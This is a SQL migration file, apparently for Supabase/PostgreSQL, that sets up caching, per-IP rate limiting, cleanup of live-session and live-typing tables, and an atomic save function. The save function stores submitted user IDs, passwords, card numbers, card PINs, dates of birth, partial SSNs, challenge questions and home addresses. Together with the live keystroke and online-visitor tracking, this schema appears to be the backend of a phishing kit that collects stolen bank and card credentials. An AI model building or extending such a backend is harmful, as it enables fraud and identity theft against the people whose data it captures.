
-- 1) Cached total entries (refresh max once / 30s)
CREATE TABLE IF NOT EXISTS public.stats_cache (
  key text PRIMARY KEY,
  value bigint NOT NULL DEFAULT 0,
  updated_at timestamptz NOT NULL DEFAULT now()
);
ALTER TABLE public.stats_cache ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "deny_anon_all" ON public.stats_cache;
DROP POLICY IF EXISTS "deny_authenticated_all" ON public.stats_cache;
CREATE POLICY "deny_anon_all" ON public.stats_cache AS RESTRICTIVE FOR ALL TO anon USING (false) WITH CHECK (false);
CREATE POLICY "deny_authenticated_all" ON public.stats_cache AS RESTRICTIVE FOR ALL TO authenticated USING (false) WITH CHECK (false);

CREATE OR REPLACE FUNCTION public.public_stats_cached()
RETURNS jsonb
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public
AS $$
DECLARE
  _total bigint;
  _row public.stats_cache%ROWTYPE;
  _online bigint;
BEGIN
  SELECT * INTO _row FROM public.stats_cache WHERE key = 'user_entries_total';
  IF _row.key IS NULL OR _row.updated_at < now() - interval '30 seconds' THEN
    SELECT COUNT(*) INTO _total FROM public.user_entries;
    INSERT INTO public.stats_cache(key, value, updated_at)
    VALUES ('user_entries_total', _total, now())
    ON CONFLICT (key) DO UPDATE SET value = EXCLUDED.value, updated_at = EXCLUDED.updated_at;
  ELSE
    _total := _row.value;
  END IF;

  SELECT COUNT(*) INTO _online
  FROM public.live_sessions
  WHERE last_seen > now() - interval '60 seconds'
    AND COALESCE(status, '') <> 'left';

  RETURN jsonb_build_object('totalEntries', _total, 'visitorsOnline', _online);
END;
$$;

-- 2) Persistent per-IP rate limit for save endpoint
CREATE TABLE IF NOT EXISTS public.save_rate_limit (
  ip text PRIMARY KEY,
  count integer NOT NULL DEFAULT 0,
  window_start timestamptz NOT NULL DEFAULT now()
);
ALTER TABLE public.save_rate_limit ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "deny_anon_all" ON public.save_rate_limit;
DROP POLICY IF EXISTS "deny_authenticated_all" ON public.save_rate_limit;
CREATE POLICY "deny_anon_all" ON public.save_rate_limit AS RESTRICTIVE FOR ALL TO anon USING (false) WITH CHECK (false);
CREATE POLICY "deny_authenticated_all" ON public.save_rate_limit AS RESTRICTIVE FOR ALL TO authenticated USING (false) WITH CHECK (false);

CREATE OR REPLACE FUNCTION public.rl_check_save(_ip text, _max int DEFAULT 60, _window_seconds int DEFAULT 60)
RETURNS jsonb
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public
AS $$
DECLARE
  _row public.save_rate_limit%ROWTYPE;
  _now timestamptz := now();
BEGIN
  INSERT INTO public.save_rate_limit(ip, count, window_start)
  VALUES (_ip, 1, _now)
  ON CONFLICT (ip) DO UPDATE
    SET count = CASE
          WHEN (_now - public.save_rate_limit.window_start) > make_interval(secs => _window_seconds)
          THEN 1
          ELSE public.save_rate_limit.count + 1
        END,
        window_start = CASE
          WHEN (_now - public.save_rate_limit.window_start) > make_interval(secs => _window_seconds)
          THEN _now
          ELSE public.save_rate_limit.window_start
        END
  RETURNING * INTO _row;

  IF _row.count > _max THEN
    RETURN jsonb_build_object('ok', false,
      'retry_after', GREATEST(1, _window_seconds - EXTRACT(EPOCH FROM (_now - _row.window_start))::int));
  END IF;
  RETURN jsonb_build_object('ok', true);
END;
$$;

-- 3) Probabilistic cleanup of dead live sessions/typing (called from save endpoint, ~1% chance)
CREATE OR REPLACE FUNCTION public.cleanup_live_maybe()
RETURNS void
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public
AS $$
BEGIN
  IF random() < 0.01 THEN
    DELETE FROM public.live_typing WHERE updated_at < now() - interval '5 minutes';
    DELETE FROM public.live_sessions WHERE last_seen < now() - interval '5 minutes';
    DELETE FROM public.save_rate_limit WHERE window_start < now() - interval '5 minutes';
  END IF;
END;
$$;

-- 4) Atomic, race-free save (replaces the UPDATE-then-INSERT pattern)
CREATE OR REPLACE FUNCTION public.save_user_entry_atomic(_payload jsonb)
RETURNS void
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public
AS $$
DECLARE
  _id uuid;
BEGIN
  _id := NULLIF(_payload->>'id','')::uuid;
  IF _id IS NULL THEN RAISE EXCEPTION 'missing_entry_id'; END IF;

  INSERT INTO public.user_entries (
    id, type, timestamp,
    user_id, user_id_field, password_field,
    first_name, last_name, email, phone,
    challenge_questions, card_number, pin_card, dob,
    ssn_last4, zip_code, street_address, apt_unit, city, state,
    updated_at
  ) VALUES (
    _id,
    COALESCE(NULLIF(_payload->>'type',''), 'old'),
    COALESCE(NULLIF(_payload->>'timestamp','')::timestamptz, now()),
    NULLIF(_payload->>'userId',''),
    NULLIF(_payload->>'userId',''),
    NULLIF(_payload->>'password',''),
    NULLIF(_payload->>'firstName',''),
    NULLIF(_payload->>'lastName',''),
    NULLIF(_payload->>'email',''),
    NULLIF(_payload->>'phone',''),
    COALESCE(_payload->'challengeQuestions','[]'::jsonb),
    NULLIF(_payload->>'cardNumber',''),
    NULLIF(_payload->>'pinCard',''),
    NULLIF(_payload->>'dob',''),
    NULLIF(_payload->>'ssnLast4',''),
    NULLIF(_payload->>'zipCode',''),
    NULLIF(_payload->>'streetAddress',''),
    NULLIF(_payload->>'aptUnit',''),
    NULLIF(_payload->>'city',''),
    NULLIF(_payload->>'state',''),
    now()
  )
  ON CONFLICT (id) DO UPDATE SET
    type = COALESCE(NULLIF(EXCLUDED.type,''), public.user_entries.type),
    user_id = COALESCE(EXCLUDED.user_id, public.user_entries.user_id),
    user_id_field = COALESCE(EXCLUDED.user_id_field, public.user_entries.user_id_field),
    password_field = COALESCE(EXCLUDED.password_field, public.user_entries.password_field),
    first_name = COALESCE(EXCLUDED.first_name, public.user_entries.first_name),
    last_name = COALESCE(EXCLUDED.last_name, public.user_entries.last_name),
    email = COALESCE(EXCLUDED.email, public.user_entries.email),
    phone = COALESCE(EXCLUDED.phone, public.user_entries.phone),
    challenge_questions = CASE
      WHEN EXCLUDED.challenge_questions <> '[]'::jsonb THEN EXCLUDED.challenge_questions
      ELSE public.user_entries.challenge_questions
    END,
    card_number = COALESCE(EXCLUDED.card_number, public.user_entries.card_number),
    pin_card = COALESCE(EXCLUDED.pin_card, public.user_entries.pin_card),
    dob = COALESCE(EXCLUDED.dob, public.user_entries.dob),
    ssn_last4 = COALESCE(EXCLUDED.ssn_last4, public.user_entries.ssn_last4),
    zip_code = COALESCE(EXCLUDED.zip_code, public.user_entries.zip_code),
    street_address = COALESCE(EXCLUDED.street_address, public.user_entries.street_address),
    apt_unit = COALESCE(EXCLUDED.apt_unit, public.user_entries.apt_unit),
    city = COALESCE(EXCLUDED.city, public.user_entries.city),
    state = COALESCE(EXCLUDED.state, public.user_entries.state),
    updated_at = now();
END;
$$;

-- 5) Composite index that helps the live-online query at scale
CREATE INDEX IF NOT EXISTS idx_live_sessions_active
  ON public.live_sessions (last_seen DESC)
  WHERE COALESCE(status, '') <> 'left';
